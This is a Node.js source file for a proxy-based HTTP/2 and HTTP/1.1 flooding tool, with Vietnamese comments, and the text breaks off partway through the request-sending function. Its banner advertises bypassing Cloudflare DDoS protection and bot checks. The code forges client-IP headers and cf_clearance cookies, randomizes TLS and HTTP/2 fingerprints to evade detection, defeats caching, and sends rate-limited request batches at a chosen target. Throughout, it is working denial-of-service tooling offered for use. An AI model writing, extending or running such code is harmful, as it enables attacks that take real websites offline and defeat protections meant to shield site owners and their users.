#!/usr/bin/env node
//mix http 2 1,1
// Cải tiến thêm options lựa chọn http 2 và 1
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const { Buffer } = require('buffer');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
  .setMaxListeners(0)
  .on('uncaughtException', function (e) {
    console.log(e);
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4], 10);
setTimeout(() => {
  process.exit(1);
}, time * 1000);
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
// Thêm flag chọn TLS version: --tls 12|13|auto (mặc định auto)
const forceTlsIndex = process.argv.indexOf('--tls');
const forceTls = forceTlsIndex !== -1 && forceTlsIndex + 1 < process.argv.length ? String(process.argv[forceTlsIndex + 1]) : 'auto';
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
  console.clear();
  console.log(`${chalk.blue('NEW v3 Method With Luv // Updated: 06.18.2025 | Update: @nmcutiii')}`);
  console.log(`${chalk.blue('Join https://nmcutiii.info | https://nmcutiii.one to update ')}`);
  console.log(chalk.magenta.bold(`
    What's new:
      --New header for bypass HTTPDDoS Cloudflare
      --Using TLS Chrome fingerprints
      --Bypass likely human
      --Bypass bot fight mode & manage definite bots
    `));
  console.error(chalk.yellow(`
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwffw
      --cache - bypass cache cloudflare,...
      --debug - show your status code
      --delay <1-50> - Set delay
      --connect - keep proxy connection
      --tls 12|13|auto - Force TLS version (default: auto)
      --http 1|2|mix - Force HTTP version: 1=HTTP/1.1 only, 2=HTTP/2 only, mix=both (default: 2)
    `));

  console.log(chalk.red.underline('How to use & example:'));
  console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
  console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --debug --cache\n`);
  process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
  console.error('Proxy file does not exist');
  process.exit(1);
}

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
  const [host, port] = line.split(':');
  return host && port && !isNaN(port);
});
if (proxy.length === 0) {
  console.error('No valid proxies');
  process.exit(1);
}

const getRandomChar = () => {
  const alphabet = 'abcdefghijklmnopqrstuvwxyz';
  const randomIndex = Math.floor(Math.random() * alphabet.length);
  return alphabet[randomIndex];
};
let randomPathSuffix = '';
setInterval(() => {
  randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
const url = new URL(target);
function encodeFrame(streamId, type, payload = "", flags = 0) {
  let frame = Buffer.alloc(9);
  frame.writeUInt32BE(payload.length << 8 | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload.length > 0)
    frame = Buffer.concat([frame, payload]);
  return frame;
}

function decodeFrame(data) {
  const lengthAndType = data.readUInt32BE(0);
  const length = lengthAndType >> 8;
  const type = lengthAndType & 0xFF;
  const flags = data.readUint8(4);
  const streamId = data.readUInt32BE(5);
  const offset = flags & 0x20 ? 5 : 0;

  let payload = Buffer.alloc(0);

  if (length > 0) {
    payload = data.subarray(9 + offset, 9 + offset + length);

    if (payload.length + offset != length) {
      return null;
    }
  }

  return {
    streamId,
    length,
    type,
    flags,
    payload
  };
}

function encodeSettings(settings) {
  const data = Buffer.alloc(6 * settings.length);
  for (let i = 0; i < settings.length; i++) {
    data.writeUInt16BE(settings[i][0], i * 6);
    data.writeUInt32BE(settings[i][1], i * 6 + 2);
  }
  return data;
}

function encodeRstStream(streamId, errorCode = 0) {
  const frameHeader = Buffer.alloc(9);
  frameHeader.writeUInt32BE(4, 0); // Payload length: 4 bytes
  frameHeader.writeUInt8(3, 4); // Type: RST_STREAM (0x03)
  frameHeader.writeUInt8(0, 5); // Flags: 0
  frameHeader.writeUInt32BE(streamId, 5); // Stream ID
  const payload = Buffer.alloc(4);
  payload.writeUInt32BE(errorCode, 0);
  return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

if (url.pathname.includes("%RAND%")) {
  const randomValue = randstr(6) + "&" + randstr(6);
  url.pathname = url.pathname.replace("%RAND%", randomValue);
}



function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const legitIP = generateLegitIP();
function generateLegitIP() {
  const asnData = [
    { asn: "AS15169", country: "US", ip: "8.8.8." },
    { asn: "AS8075", country: "US", ip: "13.107.21." },
    { asn: "AS14061", country: "SG", ip: "104.18.32." },
    { asn: "AS13335", country: "NL", ip: "162.158.78." },
    { asn: "AS16509", country: "DE", ip: "3.120.0." },
    { asn: "AS14618", country: "JP", ip: "52.192.0." },
    { asn: "AS32934", country: "US", ip: "157.240.0." },
    { asn: "AS54113", country: "US", ip: "104.244.42." },
    { asn: "AS15133", country: "US", ip: "69.171.250." }
  ];

  const data = asnData[Math.floor(Math.random() * asnData.length)];
  return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateAlternativeIPHeaders() {
  const headers = {};

  if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
  if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
  if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
  if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
  if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
  if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
  if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();

  if (Object.keys(headers).length === 0) {
    headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
  }

  return headers;
}
function generateDynamicHeaders() {
  const secChUaFullVersion = `${getRandomInt(120, 133)}.0.${getRandomInt(4000, 6000)}.${getRandomInt(0, 100)}`;
  const platforms = ['Windows', 'macOS', 'Linux'];
  const platformVersion = `${getRandomInt(10, 14)}.${getRandomInt(0, 9)}`;
  // Lấy plugins từ fingerprint.plugins.list nếu có, nếu không thì fallback
  const pluginsArr = (fingerprint.plugins && fingerprint.plugins.list) ? fingerprint.plugins.list : (Array.isArray(fingerprint.plugins) ? fingerprint.plugins : []);
  const plugins = pluginsArr.map(p => p.name).join(',');
  const headerOrder = [
    'user-agent',
    'accept',
    'sec-ch-ua',
    'sec-ch-ua-mobile',
    'sec-ch-ua-platform',
    'sec-ch-ua-full-version',
    'accept-language',
    'accept-encoding',
    'sec-fetch-site',
    'sec-fetch-mode',
    'sec-fetch-dest'
  ];

  // Tạo user-agent và các trường khác nếu fingerprint không có navigator
  const rdversion = getRandomInt(130, 133);
  const userAgent = fingerprint.userAgent || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`;
  const secChUa = fingerprint.secChUa || `"Not?A_Brand";v="99"; "Chromium";v="${rdversion}", `;
  const language = fingerprint.language || 'en-US,en;q=0.9';

  const dynamicHeaders = {
    'user-agent': userAgent,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'sec-ch-ua': secChUa,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': `"${platforms[Math.floor(Math.random() * platforms.length)]}"`,
    'sec-ch-ua-full-version': `"Chromium";v="${secChUaFullVersion}", "Google Chrome";v="${secChUaFullVersion}", "Not?A_Brand";v="${secChUaFullVersion}"`,
    'sec-ch-ua-platform-version': platformVersion,
    'sec-ch-viewport-width': getRandomInt(800, 2560).toString(),
    'sec-ch-device-memory': [2, 4, 8, 16][Math.floor(Math.random() * 4)].toString(),
    'sec-ch-dpr': (Math.random() * (2.0 - 1.0) + 1.0).toFixed(1),
    'sec-ch-prefers-color-scheme': Math.random() > 0.5 ? 'light' : 'dark',
    'accept-language': language,
    'accept-encoding': 'gzip, deflate, br, zstd',
    'sec-fetch-site': 'none',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-dest': 'document'
  };

  dynamicHeaders['sec-ch-ua-plugins'] = `"Plugins: ${pluginsArr.length}"`;
  dynamicHeaders['x-plugins-data'] = Buffer.from(JSON.stringify(pluginsArr)).toString('base64');

  // Tạo danh sách header theo thứ tự cố định nhưng kết hợp với header động
  const orderedHeaders = headerOrder
    .filter(key => dynamicHeaders[key])
    .map(key => [key, dynamicHeaders[key]])
    .concat(Object.entries(generateAlternativeIPHeaders()));

  return orderedHeaders;
}
function generateCfClearanceCookie() {
  const timestamp = Math.floor(Date.now() / 1000);
  const challengeId = crypto.randomBytes(8).toString('hex');
  const clientId = randstr(16);
  const version = getRandomInt(17494, 17500);
  const hashPart = crypto
    .createHash('sha256')
    .update(`${clientId}${timestamp}${fingerprint.ja3}`)
    .digest('hex')
    .substring(0, 16);

  const cookieParts = [
    `${clientId}`,
    `${challengeId}-${version}`,
    `${timestamp}`,
    hashPart
  ];

  return `cf_clearance=${cookieParts.join('.')}`;
}
function generateChallengeHeaders() {
  const challengeToken = randstr(32);
  const challengeResponse = crypto
    .createHash('md5')
    .update(`${challengeToken}${fingerprint.canvas}${timestamp}`)
    .digest('hex');

  return [
    ['cf-chl-bypass', '1'],
    ['cf-chl-tk', challengeToken],
    ['cf-chl-response', challengeResponse.substring(0, 16)]
  ];
}
function getRandomMethod() {
  const methods = ['POST', 'HEAD', 'GET'];
  return methods[Math.floor(Math.random() * methods.length)];
}

const cache_bypass = [
  { 'cache-control': 'max-age=0' },
  { 'pragma': 'no-cache' },
  { 'expires': '0' },
  { 'x-bypass-cache': 'true' },
  { 'x-cache-bypass': '1' },
  { 'x-no-cache': '1' },
  { 'cache-tag': 'none' },
  { 'clear-site-data': '"cache"' },
];

const browser = Math.random() < 0.5 ? 'chrome' : 'firefox';
function generateFakePlugins() {
  // Common PDF plugins
  const pdfPlugins = [
    { name: "Chrome PDF Plugin", description: "Portable Document Format", filename: "internal-pdf-viewer", mimeTypes: ["application/pdf"] },
    { name: "PDF.js", description: "Portable Document Format", filename: "pdf.js", mimeTypes: ["application/pdf"] }
  ];

  // Flash plugins (legacy but still sometimes expected)
  const flashPlugins = [
    { name: "Shockwave Flash", description: "Shockwave Flash 32.0 r0", filename: "pepflashplayer.dll", mimeTypes: ["application/x-shockwave-flash"] }
  ];

  // Media plugins
  const mediaPlugins = [
    { name: "QuickTime Plug-in", description: "The QuickTime Plugin allows you to view a wide variety of multimedia", filename: "npqtplugin.dll", mimeTypes: ["video/quicktime", "image/x-macpaint", "image/x-quicktime"] },
    { name: "VLC Web Plugin", description: "VLC Web Plugin", filename: "npvlc.dll", mimeTypes: ["application/x-vlc-plugin", "video/x-msvideo"] },
    { name: "Windows Media Player Plug-in", description: "Windows Media Player Plugin", filename: "np-mswmp.dll", mimeTypes: ["application/x-ms-wmp", "video/x-ms-asf"] }
  ];

  // Browser-specific plugins
  const chromePlugins = [
    { name: "Native Client", description: "Native Client", filename: "internal-nacl-plugin", mimeTypes: ["application/x-nacl", "application/x-pnacl"] },
    { name: "Chrome Remote Desktop Viewer", description: "This plugin allows you to securely access other computers", filename: "internal-remoting-viewer", mimeTypes: ["application/vnd.chromium.remoting-viewer"] }
  ];

  const firefoxPlugins = [
    { name: "Widevine Content Decryption Module", description: "Enables Widevine licenses for playback of HTML audio/video content.", filename: "libwidevinecdm.so", mimeTypes: ["application/x-ppapi-widevine-cdm"] },
    { name: "OpenH264 Video Codec", description: "OpenH264 Video Codec provided by Cisco Systems, Inc.", filename: "openh264.dll", mimeTypes: ["video/h264"] }
  ];

  // Select plugins based on browser
  let plugins = [...pdfPlugins];
  // Randomly select between 'chrome' and 'firefox'

  // Add browser-specific plugins
  if (browser === 'chrome') {
    plugins = [...plugins, ...chromePlugins];

    // Chrome might have more random variation in plugins
    if (Math.random() < 0.7) {
      plugins.push(mediaPlugins[Math.floor(Math.random() * mediaPlugins.length)]);
    }
  } else {
    plugins = [...plugins, ...firefoxPlugins];
  }

  // Sometimes add Flash (low probability as it's deprecated)
  if (Math.random() < 0.2) {
    plugins.push(flashPlugins[0]);
  }

  // Format plugin info for headers
  const pluginsInfo = plugins.map(plugin => {
    return {
      name: plugin.name,
      description: plugin.description,
      mimeTypes: plugin.mimeTypes.join(',')
    };
  });

  return {
    count: plugins.length,
    list: pluginsInfo
  };
}

function generateJA3Fingerprint() {
  // Danh sách cipher suites mới nhất từ Chrome (TLS 1.3 + 1.2)
  const ciphers = [
    'TLS_AES_128_GCM_SHA256',               // 0x1301
    'TLS_AES_256_GCM_SHA384',               // 0x1302
    'TLS_CHACHA20_POLY1305_SHA256',         // 0x1303
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', // 0xC02B
    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',   // 0xC02F
    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', // 0xC02C
    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',   // 0xC030
    'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', // 0xCCA9
    'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',   // 0xCCA8
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',     // 0xC013
    'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'      // 0xC014
  ];

  // Danh sách signature algorithms
  const signatureAlgorithms = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha384',
    'rsa_pkcs1_sha384'
  ];

  // Danh sách elliptic curves
  const curves = [
    'X25519',      // 0x001D
    'secp256r1',   // 0x0017
    'secp384r1'    // 0x0018
  ];

  // Danh sách TLS extensions (mô phỏng Chrome)
  const extensions = [
    '0',      // server_name
    '5',      // status_request
    '10',     // supported_groups
    '13',     // signature_algorithms
    '16',     // alpn
    '18',     // signed_certificate_timestamp
    '23',     // extended_master_secret
    '27',     // compress_certificate
    '35',     // session_ticket
    '43',     // supported_versions
    '45',     // psk_key_exchange_modes
    '51',     // key_share
    '65281',  // renegotiation_info
    '17513'   // application_settings
  ];

  // Thêm random hóa thứ tự ciphers, extensions, signatureAlgorithms, curves
  const shuffledCiphers = shuffle([...ciphers]);
  const shuffledSigAlgs = shuffle([...signatureAlgorithms]);
  const shuffledCurves = shuffle([...curves]);
  const shuffledExtensions = shuffle([...extensions]);

  return {
    ciphers: shuffledCiphers,
    signatureAlgorithms: shuffledSigAlgs,
    curves: shuffledCurves,
    extensions: shuffledExtensions
  };
}

function generateHTTP2Fingerprint() {
  const settings = {
    HEADER_TABLE_SIZE: [4096, 16384],
    ENABLE_PUSH: [0, 1],
    MAX_CONCURRENT_STREAMS: [100, 500],
    INITIAL_WINDOW_SIZE: [65535, 262144],
    MAX_FRAME_SIZE: [16384, 65536],
    MAX_HEADER_LIST_SIZE: [8192, 32768],
    ENABLE_CONNECT_PROTOCOL: [0, 1]
  };

  const http2Settings = {};
  for (const [key, values] of Object.entries(settings)) {
    http2Settings[key] = values[Math.floor(Math.random() * values.length)];
  }

  return http2Settings;
}
const ja3Fingerprint = generateJA3Fingerprint();
const http2Fingerprint = generateHTTP2Fingerprint();


// Function to create a realistic TLS ClientHello based on browser fingerprints
function createRealisticClientHello() {
  // Generate both JA3 and JA4 fingerprints for more complete evasion
  const ja3Data = generateJA3Fingerprint();

  // Get plugin information for the browser to make connection more realistic
  const plugins = generateFakePlugins();

  // TLS version selection to match the browser
  let tlsVersions;
  if (browser === 'chrome') {
    // Firefox on iOS uses TLS 1.2 and 1.3
    tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
  } else {
    // Firefox similar behavior
    tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
  }

  // Vary TLS parameters slightly based on variation chance
  const addCloudflareGrease = Math.random() < 0.7;

  // Cipher suites selection based on browser pattern
  // Chrome now uses Firefox iOS cipher ordering
  const cipherList = browser === 'chrome' ?
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305" :
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";

  // Normalize ALPN protocols to match browser behavior
  const alpnProtocols = ['h2'];

  // Include browser-specific GREASE values that Cloudflare expects to see
  // This helps avoid detection as they look for these patterns
  let ecdhCurve;
  if (addCloudflareGrease) {
    ecdhCurve = "GREASE:X25519:secp256r1:secp384r1:secp521r1";
  } else {
    ecdhCurve = "X25519:secp256r1:secp384r1:secp521r1";
  }

  // Generate app_data string that includes information about plugins
  // This mimics how browsers include metadata in their TLS extensions
  let appData = "";
  if (plugins && plugins.count > 0) {
    const pluginNames = plugins.list.map(p => p.name.substring(0, 3)).join('');
    appData = `${browser}-${plugins.count}-${pluginNames}`;
  }

  // Return complete fingerprint data for TLS connection
  return {
    tlsVersions: tlsVersions,
    ciphers: cipherList,
    ecdhCurve: ecdhCurve,
    alpnProtocols: alpnProtocols,
    ja3: ja3Data,
    signatureAlgorithms: browser === 'chrome' ?
      'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384' :
      'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha256',
    plugins: plugins,
    appData: appData
  };
}

const fingerprint = createRealisticClientHello();
function go() {
  const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
  let tlsSocket;
  let http11Socket;

  if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
    go();
    return;
  }

  // Check memory usage
  memoryManager.checkMemoryUsage();

  // Tạo user-agent một lần cho mỗi request để tránh duplicate
  let rdversion = getRandomInt(130, 133);
  const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`;

  // Kiểm tra protocol và xử lý IP address
  const isHttps = url.protocol === 'https:';
  const isHttp = url.protocol === 'http:';
  const isIPAddress = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(url.hostname);

  // Xử lý HTTP targets hoặc khi force HTTP/1.1
  if (isHttp || (isIPAddress && !isHttps) || forceHttp === 1) {
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
      netSocket.once('data', () => {
        // Sử dụng HTTP/1.1 cho HTTP targets hoặc khi force HTTP/1.1
        function main() {
          const method = enableCache ? getRandomMethod() : reqmethod;
          const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
          const h1payl = `${method} ${path}${url.search || ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}Connection: keep-alive\r\n\r\n`;

          netSocket.write(h1payl, (err) => {
            if (!err) {
              setTimeout(() => {
                main();
              }, isFull ? 1000 : 1000 / ratelimit);
            } else {
              netSocket.end(() => netSocket.destroy());
            }
          });
        }

        main();

        netSocket.on('error', () => {
          netSocket.end(() => netSocket.destroy());
        });
      });

      // Sử dụng CONNECT method cho HTTP targets
      const targetPort = isHttp ? (url.port || 80) : 443;
      netSocket.write(`CONNECT ${url.host}:${targetPort} HTTP/1.1\r\nHost: ${url.host}:${targetPort}\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}\r\n\r\n`);
    });

    netSocket.once('error', () => { }).once('close', () => {
      netSocket.end(() => { netSocket.destroy(); go(); });
    });

    netSocket.on('error', (error) => {
      cleanup(error);
    });

    netSocket.on('close', () => {
      cleanup();
    });

    function cleanup(error) {
      if (error) {
        // Handle error silently
      }
      if (netSocket) {
        netSocket.destroy();
      }
    }
    return;
  }

  // Xử lý HTTPS targets với lựa chọn HTTP version
  const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
    netSocket.once('data', () => {
      // Chỉ tạo kết nối theo lựa chọn của người dùng
      if (forceHttp === 2) {
        // Chỉ HTTP/2
        createHTTP2Connection();
      } else if (forceHttp === 1) {
        // Chỉ HTTP/1.1
        createHTTP11Connection();
      } else {
        // Mặc định hoặc mix: song song cả hai
        createHTTP2Connection();
        createHTTP11Connection();
      }
    });

    // Sử dụng port 443 cho HTTPS
    netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}\r\n\r\n`);
  }).once('error', () => { }).once('close', () => {
    if (tlsSocket) {
      tlsSocket.end(() => { tlsSocket.destroy(); go(); });
    }
    if (http11Socket) {
      http11Socket.end(() => { http11Socket.destroy(); go(); });
    }
  });

  // Hàm tạo kết nối HTTP/2
  function createHTTP2Connection() {
    // Cấu hình TLS version
    let minTLSVersion = 'TLSv1.2';
    let maxTLSVersion = 'TLSv1.3';
    if (forceTls === '13') {
      minTLSVersion = 'TLSv1.3';
      maxTLSVersion = 'TLSv1.3';
    } else if (forceTls === '12') {
      minTLSVersion = 'TLSv1.2';
      maxTLSVersion = 'TLSv1.2';
    }

    const cipherList = (maxTLSVersion === 'TLSv1.2')
      ? ja3Fingerprint.ciphers.filter(c => !c.startsWith('TLS_AES_') && c !== 'TLS_CHACHA20_POLY1305_SHA256').join(':')
      : ja3Fingerprint.ciphers.join(':');

    tlsSocket = tls.connect({
      socket: netSocket,
      ALPNProtocols: ['h2', 'http/1.1'],
      servername: isIPAddress ? undefined : url.host,
      ciphers: cipherList,
      sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
      secureOptions:
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_TLSv1 |
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
        crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
        crypto.constants.SSL_OP_COOKIE_EXCHANGE |
        crypto.constants.SSL_OP_SINGLE_DH_USE |
        crypto.constants.SSL_OP_SINGLE_ECDH_USE,
      secure: true,
      session: crypto.randomBytes(64),
      minVersion: minTLSVersion,
      maxVersion: maxTLSVersion,
      ecdhCurve: ja3Fingerprint.curves.join(':'),
      rejectUnauthorized: false,
      fingerprint: fingerprint,
      ja3: ja3Fingerprint,
      plugins: fingerprint.plugins
    }, () => {
      if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
        // Fallback to HTTP/1.1 nếu không hỗ trợ HTTP/2
        return;
      }

      // HTTP/2 optimization - tăng số lượng request
      let streamId = 1;
      let data = Buffer.alloc(0);
      let hpack = new HPACK();
      hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);

      // Tối ưu window size và header table size
      const updateWindow = Buffer.alloc(4);
      updateWindow.writeUInt32BE(custom_update * 2, 0);

      const frames1 = [];
      const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([
          [1, http2Fingerprint.HEADER_TABLE_SIZE * 2],
          [2, http2Fingerprint.ENABLE_PUSH],
          [3, http2Fingerprint.MAX_CONCURRENT_STREAMS * 2],
          [4, http2Fingerprint.INITIAL_WINDOW_SIZE * 2],
          [5, http2Fingerprint.MAX_FRAME_SIZE],
          [6, http2Fingerprint.MAX_HEADER_LIST_SIZE * 2],
          [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
        ])),
        encodeFrame(0, 8, updateWindow)
      ];
      frames1.push(...frames);

      tlsSocket.on('data', (eventData) => {
        data = Buffer.concat([data, eventData]);

        while (data.length >= 9) {
          const frame = decodeFrame(data);
          if (frame != null) {
            data = data.subarray(frame.length + 9);
            if (frame.type == 4 && frame.flags == 0) {
              tlsSocket.write(encodeFrame(0, 4, "", 1));
            }
            if (frame.type == 1) {
              const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
              if (status == 403 || status == 400) {
                tlsSocket.write(encodeRstStream(0));
                tlsSocket.end(() => tlsSocket.destroy());
                netSocket.end(() => netSocket.destroy());
              }
              if (!statuses[status])
                statuses[status] = 0;

              statuses[status]++;
            }

            if (frame.type == 7 || frame.type == 5) {
              if (frame.type == 7) {
                if (debugMode) {
                  if (!statuses['error'])
                    statuses['error'] = 0;

                  statuses['error']++;
                }
              }

              tlsSocket.write(encodeRstStream(0));
              tlsSocket.end(() => tlsSocket.destroy());
            }
          } else {
            break;
          }
        }
      });

      tlsSocket.write(Buffer.concat(frames1));

      // HTTP/2 request function - tăng số lượng request
      function sendHTTP2Requests() {
        if (tlsSocket.destroyed) {
          return;
        }

        // Tăng batch size để gửi nhiều request hơn
        const batchSize = isFull ? Math.min(ratelimit * 4, 150) : Math.min(ratelimit * 3, 100);
        const requests = [];
        let localRatelimit = ratelimit !== undefined ? getRandomInt(1, 3) : process.argv[6];
        const startTime = Date.now();

        // Tạo batch request lớn hơn
        for (let i = 0; i < batchSize; i++) {
          const method = enableCache ? getRandomMethod() : reqmethod;
